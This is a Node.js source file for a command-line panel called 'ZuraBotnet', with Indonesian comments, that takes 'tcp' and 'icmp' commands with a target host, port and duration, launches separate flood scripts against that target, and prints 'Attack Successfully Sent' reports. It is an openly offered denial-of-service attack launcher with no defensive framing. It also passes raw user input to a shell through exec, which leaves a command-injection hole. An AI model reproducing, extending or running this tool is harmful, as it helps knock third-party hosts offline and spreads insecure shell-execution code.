const readline = require('readline');
const { exec } = require('child_process');
const gradient = require('gradient-string');
const { Spinner } = require('cli-spinner');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

console.clear();
console.clear();

const displayWelcomeMessage = () => {
  const spinner = new Spinner('Loading...');
  spinner.setSpinnerString('|/-\\');
  spinner.start();

  setTimeout(() => {
    spinner.stop(true);
    console.log('\n\n\n')
    const welcomeMessage = gradient(['#00FF00', '#00FFFF'])('Hey three root, Welcome To ZuraBotnet.');
    console.log(welcomeMessage);

    const currentDate = new Date();
    const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
    const formattedDate = currentDate.toLocaleDateString('id-ID', options);

    console.log(`Type "help" to get started.\n\x1b[37m2024.\n`);

    promptUser();
  }, 2000); // Animasi berjalan selama 2 detik
};

const promptUser = () => {
  const redBg = '\x1b[41m'; // ANSI escape code untuk latar belakang merah
  const resetColor = '\x1b[0m'; // ANSI escape code untuk mereset warna

  rl.question(redBg + '\x1b[37mroot\x1b[0m > ', (answer) => {
    const [command, url, port, time] = answer.split(' ');

    if (command.toLowerCase() === 'exit') {
      rl.close();
    } else if (command.toLowerCase() === 'tcp') {
      if (url && time && port) {
        exec(`node tcp.js ${url} ${time} ${port}`, (error, stdout, stderr) => {
          if (error) {
            console.error(`Error: ${error.message}`);
            promptUser();
            return;
          }
          if (stderr) {
            console.error(`Stderr: ${stderr}`);
            promptUser();
            return;
          }
        
          // Menampilkan URL dan waktu saat ini
          const currentDate = new Date();
          const formattedDate = currentDate.toLocaleDateString('id-ID', {
            weekday: 'long',
            year: 'numeric',
            month: 'long',
            day: 'numeric',
            hour: 'numeric',
            minute: 'numeric',
            second: 'numeric'
          });
          console.log(`
  Attack Details:
    Status:    [ \x1b[32mAttack Succesfully Sent\x1b[0m ]
    Host:      [\x1b[37m ${url} \x1b[0m]
    Port:      [\x1b[37m ${port}\x1b[0m ]
    Time:      [\x1b[37m ${time} \x1b[0m]
    Method:    [\x1b[37m tcp \x1b[0m]
    Sent On:   [\x1b[37m ${formattedDate} \x1b[0m]
    `);

          promptUser();
        });
      } else {
        console.log('Example tcp <ip> <port> <time>');
        promptUser();
      }
    } else if (command.toLowerCase() === 'icmp') {
      if (url && time && port) {
        exec(`node icmp.js ${url} 20 ${time}`, (error, stdout, stderr) => {
          if (error) {
            console.error(`Error: ${error.message}`);
            promptUser();
            return;
          }
          if (stderr) {
            console.error(`Stderr: ${stderr}`);
            promptUser();
            return;
          }

          // Menampilkan URL dan waktu saat ini
          const currentDate = new Date();
          const formattedDate = currentDate.toLocaleDateString('id-ID', {
            weekday: 'long',
            year: 'numeric',
            month: 'long',
            day: 'numeric',
            hour: 'numeric',
            minute: 'numeric',
            second: 'numeric'
          });
          console.log(`
  Attack Details:
    Status:    [ \x1b[32mAttack Succesfully Sent\x1b[0m ]
    Host:      [\x1b[37m ${url} \x1b[0m]
    Port:      [\x1b[37m ${port}\x1b[0m ]
    Time:      [\x1b[37m ${time} \x1b[0m]
    Method:    [\x1b[37m icmp \x1b[0m]
    Sent On:   [\x1b[37m ${formattedDate} \x1b[0m]
    `);

          promptUser();
        });
      } else {
        console.log('Example icmp <ip> <port> <time>');
        promptUser();
      }
    } else {
      console.log(`Perintah '${command}' tidak ditemukan`);
      promptUser();
    }
  });
};

rl.on('close', () => {
  console.log('Terima kasih! Selamat tinggal!');
  process.exit(0);
});

displayWelcomeMessage();